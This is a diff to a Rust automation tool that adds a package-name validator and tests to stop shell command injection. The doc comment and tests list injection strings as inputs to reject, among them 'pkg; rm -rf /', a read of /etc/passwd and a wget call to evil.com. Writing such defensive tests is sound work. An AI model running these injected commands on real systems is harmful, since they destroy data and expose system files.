@@ -30,11 +30,64 @@ pub mod yum;
 pub use python::PythonModuleExecutor;
 
 use crate::connection::Connection;
+use once_cell::sync::Lazy;
+use regex::Regex;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::fmt;
 use std::sync::Arc;
 use thiserror::Error;
+
+/// Regex pattern for validating package names.
+/// Allows alphanumeric characters, dots, underscores, plus signs, and hyphens.
+static PACKAGE_NAME_REGEX: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"^[a-zA-Z0-9._+-]+$").expect("Invalid package name regex"));
+
+/// Validates a package name against a safe regex pattern.
+///
+/// Package names must only contain alphanumeric characters, dots, underscores,
+/// plus signs, and hyphens (`[a-zA-Z0-9._+-]+`). This prevents command injection
+/// attacks when package names are passed to shell commands.
+///
+/// # Arguments
+///
+/// * `name` - The package name to validate
+///
+/// # Returns
+///
+/// * `Ok(())` if the package name is valid
+/// * `Err(ModuleError::InvalidParameter)` if the package name contains invalid characters
+///
+/// # Examples
+///
+/// ```
+/// use rustible::modules::validate_package_name;
+///
+/// assert!(validate_package_name("nginx").is_ok());
+/// assert!(validate_package_name("python3.11").is_ok());
+/// assert!(validate_package_name("g++").is_ok());
+/// assert!(validate_package_name("lib-dev").is_ok());
+///
+/// // Invalid package names
+/// assert!(validate_package_name("pkg; rm -rf /").is_err());
+/// assert!(validate_package_name("").is_err());
+/// ```
+pub fn validate_package_name(name: &str) -> ModuleResult<()> {
+    if name.is_empty() {
+        return Err(ModuleError::InvalidParameter(
+            "Package name cannot be empty".to_string(),
+        ));
+    }
+
+    if !PACKAGE_NAME_REGEX.is_match(name) {
+        return Err(ModuleError::InvalidParameter(format!(
+            "Invalid package name '{}': must contain only alphanumeric characters, dots, underscores, plus signs, and hyphens",
+            name
+        )));
+    }
+
+    Ok(())
+}
 
 /// Errors that can occur during module execution
 #[derive(Error, Debug)]
@@ -771,5 +824,59 @@ mod tests {
                 "three".to_string()
             ])
         );
+    }
+
+    #[test]
+    fn test_validate_package_name_valid() {
+        // Simple alphanumeric names
+        assert!(validate_package_name("nginx").is_ok());
+        assert!(validate_package_name("python3").is_ok());
+        assert!(validate_package_name("vim").is_ok());
+
+        // Names with dots
+        assert!(validate_package_name("python3.11").is_ok());
+        assert!(validate_package_name("libfoo.so").is_ok());
+
+        // Names with underscores
+        assert!(validate_package_name("python_dev").is_ok());
+        assert!(validate_package_name("lib_ssl_dev").is_ok());
+
+        // Names with hyphens
+        assert!(validate_package_name("lib-dev").is_ok());
+        assert!(validate_package_name("build-essential").is_ok());
+
+        // Names with plus signs
+        assert!(validate_package_name("g++").is_ok());
+        assert!(validate_package_name("c++").is_ok());
+        assert!(validate_package_name("libstdc++").is_ok());
+
+        // Complex combinations
+        assert!(validate_package_name("libssl1.1-dev").is_ok());
+        assert!(validate_package_name("python3.11-venv").is_ok());
+        assert!(validate_package_name("libboost1.74-dev").is_ok());
+    }
+
+    #[test]
+    fn test_validate_package_name_invalid() {
+        // Empty name
+        assert!(validate_package_name("").is_err());
+
+        // Command injection attempts
+        assert!(validate_package_name("pkg; rm -rf /").is_err());
+        assert!(validate_package_name("pkg && cat /etc/passwd").is_err());
+        assert!(validate_package_name("pkg | wget evil.com").is_err());
+        assert!(validate_package_name("$(whoami)").is_err());
+        assert!(validate_package_name("`id`").is_err());
+
+        // Other invalid characters
+        assert!(validate_package_name("pkg name").is_err()); // space
+        assert!(validate_package_name("pkg\tname").is_err()); // tab
+        assert!(validate_package_name("pkg\nname").is_err()); // newline
+        assert!(validate_package_name("pkg/name").is_err()); // slash
+        assert!(validate_package_name("pkg\\name").is_err()); // backslash
+        assert!(validate_package_name("pkg'name").is_err()); // single quote
+        assert!(validate_package_name("pkg\"name").is_err()); // double quote
+        assert!(validate_package_name("pkg>file").is_err()); // redirect
+        assert!(validate_package_name("pkg<file").is_err()); // redirect
     }
 }
